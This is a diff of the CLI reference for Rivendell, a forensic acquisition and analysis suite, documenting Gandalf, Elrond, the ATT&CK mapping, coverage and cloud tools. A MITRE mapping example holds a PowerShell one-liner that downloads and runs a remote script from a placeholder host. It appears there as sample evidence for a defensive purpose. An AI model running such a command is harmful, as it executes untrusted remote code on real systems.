@@ -1,7 +1,8 @@
 # Rivendell CLI Reference
 
 **Version:** 2.1.0
-**Command:** `elrond` (Analysis) | `gandalf` (Acquisition)
+
+Every command below runs from the repository root. The Python modules are run with `python3 -m src.analysis.…`. Don't run them from inside `src/analysis`: Elrond's `platform/` package shadows the standard library `platform` module there, so anything that imports numpy or pandas loads `elrond.py` and fails on its arguments.
 
 ---
 
@@ -22,14 +23,15 @@
 
 ## Overview
 
-Rivendell provides command-line tools for forensic acquisition and analysis:
+| Tool | Entry point | Purpose |
+|---|---|---|
+| Gandalf | `src/acquisition/python/gandalf.py`, `src/acquisition/bash/gandalf.sh`, `src/acquisition/windows/Invoke-Gandalf.ps1` | Live acquisition, local or remote |
+| Elrond | `src/analysis/elrond.py` | Collection, processing and analysis of images and acquisitions |
+| MITRE tools | `src.analysis.mitre.cli`, `src.analysis.mitre.coverage_cli` | ATT&CK data, technique mapping, coverage |
+| Cloud tools | `src.analysis.rivendell.cloud.cli` | AWS, Azure and GCP acquisition and log analysis |
+| AI tools (Eru) | `src.analysis.rivendell.ai.cli` | Natural-language queries over case output |
 
-- **Gandalf** - Remote and local evidence acquisition
-- **Elrond** - Automated forensic analysis and artifact processing
-- **MITRE tools** - ATT&CK technique mapping and coverage analysis
-- **Cloud tools** - AWS/Azure/GCP forensics
-- **AI tools** - Natural language investigation queries
-- **SIEM tools** - Export to Splunk/Elasticsearch
+The web UI and API (see [API.md](API.md)) drive Elrond through the same command line.
 
 ---
 
@@ -37,162 +39,95 @@ Rivendell provides command-line tools for forensic acquisition and analysis:
 
 ### Overview
 
-Gandalf acquires forensic artifacts from local or remote systems with encryption, audit logging, and chain of custody.
+Gandalf collects artefacts from a live host into a zip archive, optionally encrypted, with a SHA-256 audit log for chain of custody.
 
-### Installation Locations
-
-- **Python**: `acquisition/python/gandalf.py`
-- **Bash**: `acquisition/bash/gandalf.sh`
-- **PowerShell**: `acquisition\powershell\Gandalf.ps1`
+| Variant | Path | Runs on |
+|---|---|---|
+| Python | `src/acquisition/python/gandalf.py` | Linux, macOS |
+| Bash | `src/acquisition/bash/gandalf.sh` | Linux, Unix |
+| PowerShell | `src/acquisition/windows/Invoke-Gandalf.ps1` | Windows |
 
 ---
 
 ### Python Syntax
 
 ```bash
-python3 acquisition/python/gandalf.py [ENCRYPTION] [TARGET] [OPTIONS]
+sudo python3 src/acquisition/python/gandalf.py ENCRYPTION ACQUISITION [OPTIONS]
 ```
 
-**Parameters:**
-- `ENCRYPTION`: Encryption password or `None` for no encryption
-- `TARGET`: `Local` or IP address/hostname for remote acquisition
+- `ENCRYPTION`: `Key` (recommended; generates a key file), `Password` (key derived with PBKDF2) or `None`
+- `ACQUISITION`: `Local` or `Remote`
 
-**Options:**
-```
--u, --user USERNAME          Remote username (required for remote)
--M, --memory                 Include memory dump
--o, --output PATH            Output directory (default: /evidence)
---vss                        Include Volume Shadow Copies (Windows)
---Userprofiles              Collect user profiles
---encrypt                    Encrypt evidence archive
--h, --help                   Show help message
-```
+| Option | Does |
+|---|---|
+| `-O, --OutputDirectory [DIR]` | Where to write the archive |
+| `-M, --Memory` | Acquire live memory (AVML on Linux, osxpmem on macOS) |
+| `-A, --AccessTimes` | Record last-access times for every file |
+| `-F, --CollectFiles` | Collect files whose names match entries in `lists/files.list` |
 
----
-
-### Examples
-
-#### Local Acquisition
+Remote mode reads target hosts from `src/acquisition/lists/hosts.list` (lines starting `#` are skipped) and prompts for each host's IP address, username and password over SSH. Run it from `src/acquisition/`, because the script opens `lists/` and `tools/` relative to the current directory.
 
 ```bash
-# Basic local acquisition with encryption
-sudo python3 acquisition/python/gandalf.py Password Local -o /evidence/CASE-001
+cd src/acquisition
 
-# With memory dump
-sudo python3 acquisition/python/gandalf.py Password Local -M -o /evidence/CASE-001
+# Local, key-encrypted, with memory
+sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001
 
-# Comprehensive local acquisition
-sudo python3 acquisition/python/gandalf.py SecurePass123 Local \
-  -M \
-  --vss \
-  --Userprofiles \
-  --encrypt \
-  -o /evidence/COMPREHENSIVE-001
+# Remote, password-encrypted; hosts come from lists/hosts.list
+sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001
 ```
 
-#### Remote Acquisition (Linux/macOS)
-
-```bash
-# Basic remote acquisition
-python3 acquisition/python/gandalf.py Password 192.168.1.100 \
-  -u administrator \
-  -o /evidence/REMOTE-001
-
-# With memory and VSS
-python3 acquisition/python/gandalf.py Password 192.168.1.100 \
-  -u admin \
-  -M \
-  --vss \
-  -o /evidence/REMOTE-001
-
-# From multiple hosts
-cat > hosts.list <<EOF
-192.168.1.100
-192.168.1.101
-192.168.1.102
-EOF
-
-for host in $(cat hosts.list); do
-  python3 acquisition/python/gandalf.py Password "$host" \
-    -u admin \
-    -M \
-    -o "/evidence/HOST-$host"
-done
-```
-
-#### Remote Acquisition (Windows)
-
-```powershell
-# Local acquisition
-.\acquisition\powershell\Gandalf.ps1 `
-  -Local `
-  -Password "Password123" `
-  -OutputDir "C:\Evidence\LOCAL-001"
-
-# Remote acquisition
-.\acquisition\powershell\Gandalf.ps1 `
-  -Target "192.168.1.100" `
-  -Username "Administrator" `
-  -Password "Password123" `
-  -IncludeMemory `
-  -IncludeVSS `
-  -OutputDir "C:\Evidence\REMOTE-001"
-
-# Multiple hosts
-$hosts = @("192.168.1.100", "192.168.1.101", "192.168.1.102")
-foreach ($host in $hosts) {
-    .\acquisition\powershell\Gandalf.ps1 `
-      -Target $host `
-      -Username "admin" `
-      -Password "Password123" `
-      -IncludeMemory `
-      -OutputDir "C:\Evidence\HOST-$host"
-}
-```
+Decrypt an archive with `python3 src/acquisition/python/passkey_decrypt.py`.
 
 ---
 
 ### Bash Syntax
 
 ```bash
-./acquisition/bash/gandalf.sh [TARGET] [USERNAME] [PASSWORD] [OUTPUT] [OPTIONS]
+sudo ./src/acquisition/bash/gandalf.sh ENCRYPTION MODE [OPTIONS]
 ```
 
-**Example:**
+| Option | Does |
+|---|---|
+| `-o DIR` | Output directory (default `/tmp/gandalf/acquisitions`) |
+| `-m` | Acquire memory |
+| `-a` | Collect access times |
+| `-c` | Collect files listed in `files.list` |
+| `-h HOST`, `-u USER` | Remote host and user |
+| `-f FILE` | Hosts file for batch remote acquisition |
+
 ```bash
-sudo ./acquisition/bash/gandalf.sh 192.168.1.100 admin Password /evidence/CASE-001 --memory
+sudo ./src/acquisition/bash/gandalf.sh None Local
+sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
+sudo ./src/acquisition/bash/gandalf.sh Key Remote -h 192.168.1.100 -u analyst
 ```
+
+---
+
+### PowerShell Syntax
+
+```powershell
+.\src\acquisition\windows\Invoke-Gandalf.ps1 -EncryptionObject Key -Acquisition Local `
+  -OutputDirectory C:\TEMP\gandalf\gandalf -Memory -ShowProgress -CollectFiles
+```
+
+`-EncryptionObject` takes `Key`, `Password` or `None`; `-Acquisition` takes `Local` or `Remote`. With no arguments it runs `-EncryptionObject None -Acquisition Local -OutputDirectory C:\TEMP\gandalf\gandalf`.
 
 ---
 
 ### Output Structure
 
-Gandalf creates a tarball with the following structure:
-
 ```
-hostname.tar.gz
+<host>.zip            # or <host>.zip.enc when encrypted
 ├── artefacts/
-│   ├── host.info              # System information
-│   ├── memory/                # Memory dump (if -M used)
-│   │   └── hostname.mem
-│   ├── logs/                  # System logs
-│   ├── registry/              # Windows registry (Windows only)
-│   ├── browsers/              # Browser artifacts
-│   ├── users/                 # User profiles (if --Userprofiles)
-│   └── vss/                   # Volume shadow copies (if --vss)
-├── log.audit                  # Audit log with SHA256 hashes
-└── log.meta                   # Acquisition metadata
+│   ├── host.info     # system information
+│   ├── <host>.mem    # memory (Linux); mem.aff4 / mem.raw on macOS
+│   └── …             # logs, plists, registry, browser and user artefacts by type
+├── log.audit         # SHA-256 of every acquired file
+└── log.meta          # acquisition metadata
 ```
 
----
-
-### Security Features
-
-1. **Encryption**: AES-256 encryption using provided password
-2. **Hashing**: SHA256 hashes for all acquired files in `log.audit`
-3. **Chain of Custody**: Detailed metadata in `log.meta`
-4. **Audit Trail**: All operations logged with timestamps
-5. **Read-Only**: Evidence acquired without modification
+Gandalf encrypts with Fernet (AES-128-CBC with HMAC-SHA256). Pass the archive to Elrond with `--Gandalf`.
 
 ---
 
@@ -205,912 +140,344 @@ Elrond automates forensic analysis of acquired evidence, processing artifacts th
 ### Syntax
 
 ```bash
-elrond [FLAGS] CASE_ID SOURCE_PATH OUTPUT_PATH [OPTIONS]
+python3 src/analysis/elrond.py CASE_ID SOURCE_DIR [DEST_DIR] [OPTIONS]
 ```
 
-**Required Arguments:**
-- `CASE_ID`: Case identifier (e.g., CASE-2025-001)
-- `SOURCE_PATH`: Path to evidence (disk image, Gandalf archive, or directory)
-- `OUTPUT_PATH`: Output directory for results
+- `CASE_ID`: case or incident identifier
+- `SOURCE_DIR`: directory holding the evidence (disk and memory images, Gandalf archives or Mordor datasets)
+- `DEST_DIR`: output directory (default: current directory)
+
+Elrond defines long options only. argparse accepts any unambiguous prefix (`--Coll` for `--Collect`), but there are no single-letter flags. The web UI and API build the same command (`build_elrond_command` in `src/web/backend/tasks_docker.py`).
+
+Memory analysis reads memory images from `SOURCE_DIR` alongside the disk images; there is no separate memory path option.
 
 ---
 
 ### Evidence Sources
 
-Evidence sources determine how Elrond reads and interprets the input data:
-
-**Local** (`-C, --Collect`)
-- Mount disk images (E01, RAW, DD, VMDK, VHD/VHDX)
-- Extract artifacts from filesystems
-- Parse MFT, USN Journal, event logs
-- Collect browser artifacts, registry, etc.
-
-**Gandalf** (`-G, --Gandalf`)
-- Read artifacts acquired using Gandalf acquisition tool
-- Process pre-collected tarballs from remote/local systems
-
-**Cloud**
-- Process cloud storage acquisitions (AWS S3, Azure Blob, GCP)
-- Analyze CloudTrail, Activity Logs, and cloud audit data
-
-**Mordor** (`--Mordor`)
-- Read artifacts from OTRF Mordor attack simulation datasets
-- Pre-collected threat data for detection testing and research
-
-**JSON**
-- Load configuration from JSON file
-- Automated/scripted analysis with predefined settings
+| Option | Reads |
+|---|---|
+| `--Collect` | Disk and memory images (E01, raw/dd, VMDK, VHD/VHDX); Elrond mounts them and collects artefacts |
+| `--Gandalf` | Archives acquired with Gandalf |
+| `--Mordor` | OTRF Mordor attack-simulation datasets |
 
 ---
 
-### Processing Modes
+### Modes
 
-Processing modes control the depth and scope of analysis:
+| Option | Enables |
+|---|---|
+| `--Brisk` | `--Analysis`, `--extractIocs`, `--Navigator`, `--Process`, `--Userprofiles` |
+| `--ThreatHunt` | Aggressive threat hunting: `--Analysis`, `--extractIocs`, `--Memory`, `--Navigator`, `--Process` and more; needs the SIEM services up |
+| `--eXhaustive` | Every option: Brisk plus `--Delete`, `--Elastic`, `--Memory`, `--nsrl`, `--Splunk`, `--Timeline`, `--memorytimeline` |
 
-**Brisk** (`-B, --Brisk`)
-- Optimized balance of speed and thoroughness
-- Enables: Analysis, extractIocs, Navigator, Userprofiles
-- Recommended for most investigations
-
-**Exhaustive** (`-X, --eXhaustive`)
-- Maximum thoroughness with all options enabled
-- Enables: All Brisk options plus Memory, Timeline, NSRL, Splunk, Elastic, Archive
-- Use for comprehensive deep-dive investigations
-
-**Custom**
-- Full control over all processing options
-- Select individual features as needed
-
-**Template**
-- Load a saved template of custom options
-- Reuse configurations across investigations
+`--Brisk` is not faster than a plain run: it adds analysis and IOC extraction. See [PERFORMANCE.md](PERFORMANCE.md) for what each option costs.
 
 ---
 
-### Processing (Always Enabled)
+### Options
 
-Processing is always enabled automatically for all evidence sources and processing modes:
-- Parse collected artifacts
-- Convert binary data to CSV/JSON
-- Generate structured reports
-- Note: The `-P, --Process` flag is accepted but redundant
+**Phases**
 
----
+| Option | Does |
+|---|---|
+| `--Process` | Parse collected artefacts (always runs) |
+| `--Analysis` | Automated analysis: extended attributes, ADS, timestomping and more |
+| `--Memory` | Volatility 3 analysis of memory images |
+| `--Timeline` | Plaso timeline of the disk image. Very slow (105 min on a 12 GB E01) |
+| `--memorytimeline` | Volatility timeliner on memory images |
 
-### Common Flags
+**Collection and processing**
 
-**Evidence Source Flags:**
-```
--C, --Collect               Local disk/memory images
--G, --Gandalf               Gandalf acquisition archives
---Mordor                    OTRF Mordor datasets
-```
+| Option | Does |
+|---|---|
+| `--vss` | Collect and process every Volume Shadow Copy. Each copy costs about as much as the live volume |
+| `--Userprofiles` | Collect user profile artefacts |
+| `--collectFiles [FILTER]` | Collect files by type (binaries, documents, scripts, …); optional inclusion/exclusion file. Selecting all types includes carving |
+| `--symlinks` | Follow symbolic links when copying folders. Slow |
+| `--extractIocs` | Extract IOCs from processed files. Slow |
+| `--iocsFile FILE` | Match extracted IOCs against a watchlist |
+| `--Keywords FILE` | Search for keywords. Remove blank and `#` lines first: they match every line |
+| `--Yara DIR` | Scan with YARA rules, against the whole mounted image or only collected files. Symbolic links are not followed (`yara -N`) |
+| `--misplacedBinaries` | Find Windows system binaries in unexpected locations (**T1036.005**) |
+| `--masquerading` | RLO characters, double extensions, trailing spaces, renamed utilities (**T1036**) |
+| `--magicBytes` | Verify file signatures |
 
-**Processing Mode Flags:**
-```
--B, --Brisk                 Brisk mode (balanced speed/thoroughness)
--X, --eXhaustive            Exhaustive analysis (all artifacts)
--q, --quick                 Quick analysis (essential artifacts only)
--Q, --superQuick            Super quick (critical artifacts only)
-```
+**Hashing**
 
-**Phase Flags:**
-```
--P, --Process               Processing phase (always enabled, flag optional)
--A, --Analysis              Analysis phase
--M, --Memory                Memory analysis with Volatility3
--T, --Timeline              Generate timeline with Plaso
-```
+| Option | Does |
+|---|---|
+| `--hashCollected` | Hash collected and processed artefacts and their metadata |
+| `--hashAll` | Hash every file on the mounted images |
+| `--metacollected` | Hash and extract metadata only for collected artefacts |
+| `--nsrl` | Compare hashes against NSRL known-goods (needs Internet access) |
 
-**Feature Flags:**
-```
--I, --extractIocs           Extract indicators of compromise
--Y, --Yara PATH             Scan with YARA rules
--K, --Keywords FILE         Search for keywords
--c, --vss                   Process Volume Shadow Copies
--U, --Userprofiles          Collect user profiles
-```
+**Output**
 
-**SIEM Export:**
-```
--S, --Splunk                Export to Splunk HEC
--E, --Elastic               Export to Elasticsearch
--N, --Navigator             Generate MITRE Navigator layer
-```
+| Option | Does |
+|---|---|
+| `--Splunk` | Index output into the local Splunk instance |
+| `--Elastic` | Index output into the local Elasticsearch instance |
+| `--Navigator` | Build an ATT&CK Navigator layer (requires `--Splunk`) |
+| `--Ziparchive` | Zip raw data after processing |
+| `--Delete` | Delete raw data after processing |
 
-**Other:**
-```
---veryverbose               Maximum verbosity
--h, --help                  Show help
---version                   Show version
---check-dependencies        Verify tool installation
-```
+SIEM options fail fast if the service is unreachable. Start them with `docker compose --profile siem up -d`.
 
 ---
 
 ### Examples
 
-#### Basic Analysis
-
 ```bash
-# Collect and process disk image
-elrond -C -P CASE-001 /evidence/disk.E01 /output/CASE-001
+# Collect and process a disk image
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process
 
-# Full workflow
-elrond -C -P -A CASE-001 /evidence/disk.E01 /output/CASE-001
+# Add analysis
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis
 
-# With memory analysis
-elrond -C -P -A -M CASE-001 \
-  /evidence/disk.E01 \
-  /output/CASE-001 \
-  -m /evidence/memory.dmp
+# Disk and memory together (both images in /evidence)
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Memory
 
-# Timeline generation
-elrond -C -P -T CASE-001 /evidence/disk.E01 /output/CASE-001
-```
+# Brisk mode
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Brisk
 
-#### Speed Modes
+# IOC extraction and YARA
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
+  --Collect --Process --Analysis --extractIocs --Yara /opt/yara-rules
 
-```bash
-# Quick triage
-elrond -C -P -A -q CASE-001 /evidence/disk.E01 /output/CASE-001
+# Shadow copies and user profiles
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --vss --Userprofiles
 
-# Brisk mode (recommended for most cases)
-elrond -C -P -A -B CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# Exhaustive analysis
-elrond -C -P -A -X CASE-001 /evidence/disk.E01 /output/CASE-001
-```
-
-#### Advanced Features
-
-```bash
-# IOC extraction and YARA scanning
-elrond -C -P -A -I \
-  -Y /path/to/yara/rules \
-  CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# Keyword search
-elrond -C -P -A -K /path/to/keywords.txt \
-  CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# VSS processing
-elrond -C -P -A -c CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# User profile collection
-elrond -C -P -A -U CASE-001 /evidence/disk.E01 /output/CASE-001
-```
-
-#### SIEM Integration
-
-```bash
-# Export to Splunk
-elrond -C -P -A -S CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# Export to Elasticsearch
-elrond -C -P -A -E CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# Both SIEM platforms
-elrond -C -P -A -S -E CASE-001 /evidence/disk.E01 /output/CASE-001
-
-# With MITRE Navigator
-elrond -C -P -A -S -N CASE-001 /evidence/disk.E01 /output/CASE-001
-```
-
-#### Complete Workflow
-
-```bash
-# Comprehensive analysis with all features
-elrond -C -P -A -M -T -I -c -U -B -N -S \
-  CASE-001 \
-  /evidence/disk.E01 \
-  /output/CASE-001 \
-  -m /evidence/memory.dmp \
-  -Y /opt/yara-rules \
-  -K /opt/keywords.txt \
-  --veryverbose
+# SIEM export with Navigator layer
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
+  --Collect --Process --Analysis --Splunk --Elastic --Navigator
 ```
 
 ---
 
 ### Output Structure
 
-Elrond creates structured output:
+Elrond writes one directory per case, with one subdirectory per image. Taken from the October 2026 test runs:
 
 ```
-/output/CASE-001/
-├── collected/                 # Collected artifacts
-│   ├── registry/
-│   ├── event_logs/
-│   ├── prefetch/
-│   └── browsers/
-├── processed/                 # Parsed data
-│   ├── timeline.csv          # Master timeline
-│   ├── registry.csv          # Registry analysis
-│   ├── browsers.csv          # Browser history
-│   ├── event_logs.csv        # Parsed event logs
-│   └── file_system.csv       # MFT analysis
-├── analysis/                  # Analysis results
-│   ├── iocs.csv              # Indicators of Compromise
-│   ├── keywords.csv          # Keyword matches
-│   ├── yara_matches.csv      # YARA rule matches
-│   └── attck_matrix.json     # MITRE ATT&CK mapping
-├── memory/                    # Memory analysis (if -M)
-│   ├── processes.csv
-│   ├── network.csv
-│   ├── registry.csv
-│   └── filescan.csv
-├── splunk/                    # Splunk export (if -S)
-│   └── events.json
-├── elastic/                   # Elastic export (if -E)
-│   └── events.json
-├── navigator/                 # MITRE Navigator (if -N)
-│   └── attck_layer.json
-└── logs/
-    ├── elrond.log            # Execution log
-    └── errors.log            # Error log
+<output>/<case>/
+├── rivendell_audit.log            # CSV: timestamp (UTC), image, stage, entry
+├── mitre_techniques.txt           # ATT&CK techniques identified
+├── <case>_navigator.json          # ATT&CK Navigator layer (if -N)
+├── .memory_profiles.json          # memory jobs only
+├── <disk image>/
+│   ├── artefacts/
+│   │   ├── raw/                   # collected files, as found on the image
+│   │   ├── cooked/                # parsed artefacts
+│   │   │   ├── registry/  evt/  browsers/  jumplists/
+│   │   │   ├── journal_mft.json  shimcache.json  usb.log.json  wbem.json
+│   │   └── plaso_timeline.csv     # if -T
+│   ├── analysis/                  # written only when there are results
+│   │   ├── analysis.csv           # if -A
+│   │   ├── iocs.csv               # if -I
+│   │   ├── keyword_matches.csv    # if -K
+│   │   └── yara.csv               # if -Y
+│   └── carved/                    # if carving; one folder per file type plus foremost's audit.txt
+└── <memory image>/
+    └── windows.<plugin>.<Plugin>.json   # one file per Volatility 3 plugin
 ```
+
+Shadow copies (`--vss`) get their own `<image> (volume shadow copy #N)` entries in the audit log.
 
 ---
 
 ## MITRE ATT&CK Tools
 
-### Update MITRE Data
-
-Download latest MITRE ATT&CK framework data:
+### Framework and Mapping (`mitre.cli`)
 
 ```bash
-# Update framework data
-python3 -m rivendell.mitre.updater
+python3 -m src.analysis.mitre.cli [-v] COMMAND ...
+```
 
-# Force update (ignore cache)
-python3 -m rivendell.mitre.updater --force
+| Command | Arguments | Does |
+|---|---|---|
+| `update` | `[-d enterprise\|mobile\|ics] [-f]` | Download ATT&CK data; `-f` ignores a fresh cache |
+| `map` | `ARTIFACT_TYPE [-c CONTEXT] [-d JSON] [-o FILE]` | Map one artefact to techniques |
+| `list-artifacts` | `[--detailed]` | List artefact types the mapper knows |
+| `info` | `TECHNIQUE_ID [-d DOMAIN] [-o FILE]` | Show a technique |
+| `stats` | `[-d DOMAIN] [--detailed]` | Framework statistics |
+| `dashboard` | `-i MAPPINGS.json [-o DIR] [-f splunk,elastic,navigator]` | Build dashboards from a mappings file (default output `/tmp/rivendell/dashboards`) |
 
-# Specify ATT&CK version
-python3 -m rivendell.mitre.updater --version 14.1
+```bash
+python3 -m src.analysis.mitre.cli update
+python3 -m src.analysis.mitre.cli map powershell_history -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
+python3 -m src.analysis.mitre.cli info T1059.001
 ```
 
 ---
 
-### Map Artifacts to Techniques
+### Coverage Analysis (`mitre.coverage_cli`)
 
-Automatically map forensic artifacts to ATT&CK techniques:
+Every command takes `CASE_ID OUTPUT_DIR`.
 
-```bash
-# Map case artifacts
-python3 -m rivendell.mitre.mapper /output/CASE-001
-
-# Specify output location
-python3 -m rivendell.mitre.mapper /output/CASE-001 -o /output/CASE-001/attck.json
-
-# Verbose output
-python3 -m rivendell.mitre.mapper /output/CASE-001 --verbose
-```
-
-**Output:** JSON file with technique mappings
-
----
-
-### Generate ATT&CK Dashboard
-
-Create HTML dashboard of detected techniques:
+| Command | Extra arguments | Does |
+|---|---|---|
+| `init` | — | Start coverage tracking for a case |
+| `analyze` | `ARTIFACT_TYPE ARTIFACT_PATH [-c CONTEXT] [-d JSON]` | Add one artefact |
+| `batch` | `ARTIFACT_LIST` (CSV: `type,path,context`) | Add many artefacts |
+| `report` | `[--detailed]` | Coverage report |
+| `stats` | `[--detailed]` | Coverage statistics |
+| `dashboard` | `[-o FILE.html]` | Standalone HTML dashboard |
+| `export` | `[-f json,csv,html,splunk,elastic] [-o PATH]` | Export coverage data |
 
 ```bash
-# Generate dashboard
-python3 -m rivendell.mitre.dashboard -o /output/dashboard.html
-
-# For specific case
-python3 -m rivendell.mitre.dashboard \
-  --case-data /output/CASE-001/attck.json \
-  -o /output/CASE-001/dashboard.html
-
-# Include coverage statistics
-python3 -m rivendell.mitre.dashboard \
-  --show-coverage \
-  -o /output/dashboard.html
+python3 -m src.analysis.mitre.coverage_cli init CASE-001 /output/CASE-001
+python3 -m src.analysis.mitre.coverage_cli dashboard CASE-001 /output/CASE-001 -o coverage.html
 ```
 
----
-
-### Generate Navigator Layer
-
-Create ATT&CK Navigator layer file:
-
-```bash
-# Generate layer
-python3 -m rivendell.mitre.navigator /output/CASE-001 -o navigator.json
-
-# With custom name
-python3 -m rivendell.mitre.navigator /output/CASE-001 \
-  --name "CASE-001 Analysis" \
-  --description "Investigation findings" \
-  -o navigator.json
-```
-
-Upload `navigator.json` to https://mitre-attack.github.io/attack-navigator/
-
----
-
-### Coverage Analysis
-
-Analyze detection coverage across ATT&CK matrix:
-
-```bash
-# Analyze coverage for case
-python3 -m rivendell.coverage.analyzer /output/CASE-001
-
-# Real-time monitoring
-python3 -m rivendell.coverage.monitor --watch /output
-
-# Generate coverage report
-python3 -m rivendell.coverage.dashboard -o coverage.html
-```
+The ATT&CK Navigator layer for a case comes from Elrond (`--Navigator`) or the API (`GET /api/jobs/{job_id}/navigator`), not from these tools.
 
 ---
 
 ## Cloud Forensics
 
-### AWS Commands
-
-#### List Resources
-
 ```bash
-# List EC2 instances
-python3 -m rivendell.cloud.cli aws list --credentials aws_creds.json
-
-# List instances in specific region
-python3 -m rivendell.cloud.cli aws list \
-  --credentials aws_creds.json \
-  --region us-east-1
-
-# Filter by tags
-python3 -m rivendell.cloud.cli aws list \
-  --credentials aws_creds.json \
-  --tags "Environment=Production"
+python3 -m src.analysis.rivendell.cloud.cli {aws|azure|gcp} COMMAND [OPTIONS]
 ```
 
-#### Acquire Disk Snapshot
+| Command | Options | Does |
+|---|---|---|
+| `list` | `[-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o FILE]` | List instances |
+| `acquire-disk` | `-i INSTANCE [-c CREDS] [--region R] [--resource-group G] [--zone Z] [-o DIR] [--wait]` | Snapshot an instance's disks |
+| `acquire-logs` | `[-c CREDS] [--days N \| --start-time ISO --end-time ISO] [-o DIR] [--analyze]` | Pull CloudTrail, Azure Activity or GCP Cloud Logging |
+| `analyze-logs` | `-f LOG_FILE [-c CREDS] [-o DIR]` | Analyse acquired logs |
+
+`--region` applies to AWS (and Azure location), `--resource-group` to Azure, `--zone` to GCP.
 
 ```bash
-# Acquire EC2 disk
-python3 -m rivendell.cloud.cli aws acquire-disk \
-  --instance-id i-1234567890abcdef0 \
-  --output ./snapshots/AWS-001
-
-# Specific volume
-python3 -m rivendell.cloud.cli aws acquire-disk \
-  --instance-id i-1234567890abcdef0 \
-  --volume-id vol-1234567890abcdef0 \
-  --output ./snapshots/AWS-001
-
-# With credentials file
-python3 -m rivendell.cloud.cli aws acquire-disk \
-  --credentials aws_creds.json \
-  --instance-id i-1234567890abcdef0 \
-  --output ./snapshots/AWS-001
-```
-
-#### Acquire CloudTrail Logs
-
-```bash
-# Last 7 days
-python3 -m rivendell.cloud.cli aws acquire-logs \
-  --days 7 \
-  --output ./logs/AWS-001
-
-# Specific services
-python3 -m rivendell.cloud.cli aws acquire-logs \
-  --days 30 \
-  --services cloudtrail,vpc,s3 \
-  --output ./logs/AWS-001
-
-# Date range
-python3 -m rivendell.cloud.cli aws acquire-logs \
-  --start-date 2025-01-01 \
-  --end-date 2025-01-15 \
-  --output ./logs/AWS-001
-```
-
-#### Analyze CloudTrail
-
-```bash
-# Analyze logs
-python3 -m rivendell.cloud.cli aws analyze-logs \
-  --log-file ./logs/AWS-001/cloudtrail.json \
-  --output ./analysis/AWS-001
-
-# Filter by user
-python3 -m rivendell.cloud.cli aws analyze-logs \
-  --log-file ./logs/AWS-001/cloudtrail.json \
-  --user suspicious-user \
-  --output ./analysis/AWS-001
-
-# Detect suspicious activity
-python3 -m rivendell.cloud.cli aws analyze-logs \
-  --log-file ./logs/AWS-001/cloudtrail.json \
-  --detect-suspicious \
-  --output ./analysis/AWS-001
-```
-
----
-
-### Azure Commands
-
-#### List Resources
-
-```bash
-# List VMs
-python3 -m rivendell.cloud.cli azure list --credentials azure_creds.json
-
-# Specific resource group
-python3 -m rivendell.cloud.cli azure list \
-  --credentials azure_creds.json \
-  --resource-group production
-```
-
-#### Acquire VM Disk
-
-```bash
-# Acquire disk snapshot
-python3 -m rivendell.cloud.cli azure acquire-disk \
-  --instance-id myvm \
-  --resource-group mygroup \
-  --output ./snapshots/AZURE-001
-
-# With credentials
-python3 -m rivendell.cloud.cli azure acquire-disk \
-  --credentials azure_creds.json \
-  --instance-id myvm \
-  --resource-group mygroup \
-  --output ./snapshots/AZURE-001
-```
-
-#### Acquire Activity Logs
-
-```bash
-# Last 30 days
-python3 -m rivendell.cloud.cli azure acquire-logs \
-  --days 30 \
-  --output ./logs/AZURE-001
-
-# Specific subscription
-python3 -m rivendell.cloud.cli azure acquire-logs \
-  --subscription-id abc-123 \
-  --days 30 \
-  --output ./logs/AZURE-001
-```
-
----
-
-### GCP Commands
-
-#### List Resources
-
-```bash
-# List instances
-python3 -m rivendell.cloud.cli gcp list --credentials gcp_creds.json
-
-# Specific project
-python3 -m rivendell.cloud.cli gcp list \
-  --credentials gcp_creds.json \
-  --project myproject
-```
-
-#### Acquire Disk Snapshot
-
-```bash
-# Acquire disk
-python3 -m rivendell.cloud.cli gcp acquire-disk \
-  --instance-id myinstance \
-  --zone us-central1-a \
-  --output ./snapshots/GCP-001
-
-# With credentials
-python3 -m rivendell.cloud.cli gcp acquire-disk \
-  --credentials gcp_creds.json \
-  --instance-id myinstance \
-  --zone us-central1-a \
-  --output ./snapshots/GCP-001
-```
-
-#### Acquire Cloud Logging
-
-```bash
-# Last 30 days
-python3 -m rivendell.cloud.cli gcp acquire-logs \
-  --days 30 \
-  --output ./logs/GCP-001
-
-# Filter by resource
-python3 -m rivendell.cloud.cli gcp acquire-logs \
-  --days 30 \
-  --resource-type gce_instance \
-  --output ./logs/GCP-001
+python3 -m src.analysis.rivendell.cloud.cli aws list -c aws_creds.json --region eu-west-2
+python3 -m src.analysis.rivendell.cloud.cli aws acquire-disk -i i-1234567890abcdef0 -o ./snapshots/AWS-001 --wait
+python3 -m src.analysis.rivendell.cloud.cli azure acquire-logs --days 30 -o ./logs/AZURE-001 --analyze
+python3 -m src.analysis.rivendell.cloud.cli gcp acquire-disk -i myinstance --zone europe-west2-a -o ./snapshots/GCP-001
 ```
 
 ---
 
 ## AI Agent
 
-The AI agent enables natural language querying of investigation data.
-
-### Index Case Data
-
-Index artifacts for AI querying:
+Eru indexes case output into a vector store and answers questions over it with a local LLM (Ollama by default, or llama.cpp).
 
 ```bash
-# Index case
-rivendell-ai index CASE-001 /output/CASE-001
-
-# Re-index (update)
-rivendell-ai index CASE-001 /output/CASE-001 --reindex
-
-# Verbose indexing
-rivendell-ai index CASE-001 /output/CASE-001 --verbose
+python3 -m src.analysis.rivendell.ai.cli COMMAND ...
 ```
 
----
+| Command | Arguments | Does |
+|---|---|---|
